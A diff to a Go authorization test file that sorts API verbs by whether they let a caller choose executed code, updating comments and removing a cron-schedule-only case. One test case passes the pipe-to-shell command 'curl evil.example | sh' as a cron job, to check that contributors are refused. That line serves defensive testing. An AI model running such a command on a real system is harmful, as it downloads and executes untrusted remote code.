@@ -43,8 +43,10 @@ import (
 // exists to make expensive — see TestExecutableSelectionClassIsComplete below.
 //
 // The reflection sweep in roleladder_test.go cannot cover this: it invokes verbs
-// with zero-valued arguments, so for the two CONDITIONAL verbs (Trigger,
-// SetCronJob) it only ever observes the lifecycle branch.
+// with zero-valued arguments, so for the CONDITIONAL verb (Trigger) it only
+// ever observes the lifecycle branch. SetCronJob was conditional too until
+// w9/m619 made every cron update, a schedule alone included, a service setting
+// on can_create; its command case stays here because it is still the class.
 //
 // WHERE THE CLASS ENDS. A verb is in it when the API accepts code from OUTSIDE
 // the service's already-approved source: an arbitrary command string, an
@@ -57,9 +59,12 @@ import (
 // repository at all, and every pre-existing subtree or Dockerfile (vendored
 // examples, an old branch's file, anyone's historical commit) is selectable
 // by them — so pointing BuildKit's context and Dockerfile at chosen in-repo
-// bytes IS choosing what executes, and both verbs gate on can_create. Verbs
-// that only select WHEN the approved content runs (a cron schedule, a bare
-// redeploy) remain lifecycle on can_operate. The line matters because it is
+// bytes IS choosing what executes, and both verbs gate on can_create. A verb
+// that only runs the approved content again (a bare redeploy) remains
+// lifecycle on can_operate. A cron schedule, which chooses only WHEN it runs,
+// was lifecycle too until w9/m619: it is a service setting, which Render's
+// Contributor cannot modify, so it needs can_create for that reason rather
+// than this file's (roleladder_test.go pins it). The line matters because it is
 // what a future reviewer needs in order to place a new verb. What bex CAN
 // govern is what it accepts as input, which is exactly this class.
 
@@ -109,13 +114,6 @@ func execSelectionCases() []execSelectionCase {
 		selectsExecutable: true,
 		invoke: func(ctx context.Context, base *core.Base) error {
 			_, err := (&apps.Service{Base: base}).SetCronJob(ctx, "web", nil, strp("curl evil.example | sh"))
-			return err
-		},
-	}, {
-		name:              "cron schedule only (lifecycle: WHEN it runs, not WHAT)",
-		selectsExecutable: false,
-		invoke: func(ctx context.Context, base *core.Base) error {
-			_, err := (&apps.Service{Base: base}).SetCronJob(ctx, "web", strp("0 * * * *"), nil)
 			return err
 		},
 	}, {
@@ -177,8 +175,8 @@ func execSelectionCases() []execSelectionCase {
 
 // TestExecutableSelectionRequiresCanCreate pins the relation each call in the
 // class gates on. It fails on the pre-m68 code for the five create-like cases
-// (all of which gated on can_operate) and would fail again if either
-// conditional verb's lifecycle branch were over-tightened into can_create,
+// (all of which gated on can_operate) and would fail again if the bare
+// deploy trigger's lifecycle branch were over-tightened into can_create,
 // which would take a legitimate contributor capability away.
 func TestExecutableSelectionRequiresCanCreate(t *testing.T) {
 	ctx := core.WithIdentity(context.Background(), core.Identity{Subject: "client-1", Method: "oauth2"})
@@ -202,7 +200,7 @@ func TestExecutableSelectionRequiresCanCreate(t *testing.T) {
 
 // TestContributorCannotSelectExecutables is the same table read as the attack:
 // a contributor — who holds can_operate and can_view_logs but not can_create —
-// is refused every call that chooses code, and keeps both lifecycle calls.
+// is refused every call that chooses code, and keeps the bare redeploy.
 // This is the assertion that states the product rule: the contributor role is
 // not a code-execution role.
 func TestContributorCannotSelectExecutables(t *testing.T) {
